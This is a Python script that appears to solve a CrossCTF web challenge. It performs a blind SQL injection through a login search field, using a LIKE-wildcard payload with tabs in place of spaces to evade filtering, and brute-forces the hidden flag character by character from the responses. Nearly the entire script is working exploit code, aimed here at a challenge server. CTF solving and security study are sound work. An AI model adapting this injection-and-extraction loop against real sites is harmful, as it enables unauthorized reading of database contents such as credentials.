#!/usr/bin/env python3
import requests
import string

CHAR_LIST = (string.printable
                .replace(' ', '')
                .replace('\'', '')
                .replace('"', ''))


payload = "admin%' and flag like '?%' and '%'= '".replace(' ', '\t')
flag = "CrossCTF{"

while len(flag) < 100: # loop until we bruteforce all letters
    print(f"Progress: {flag} [{len(flag)}]")

    for ch in CHAR_LIST:
        # % and _ are used as wildcards in SQLite.
        # escape them
        ch = ch.replace('%', '\\%') 
        ch = ch.replace('_', '\\_')

        guess = flag + ch
        
        r = requests.post("http://ctf.pwn.sg:8180/?search", 
            data= {
                'username': payload.replace('?', guess),
                'action': '',
            }
        )

        # if successful return
        if '<table>' in r.text:
            username_html = r.text.split('<table>')[1]
            if 'admin' in username_html:
                flag += ch
                print("Success:", ch)
                break
        
        print("Failed:", ch)

    if flag.endswith('}'):
        print("Final flag: ", flag)
        quit()
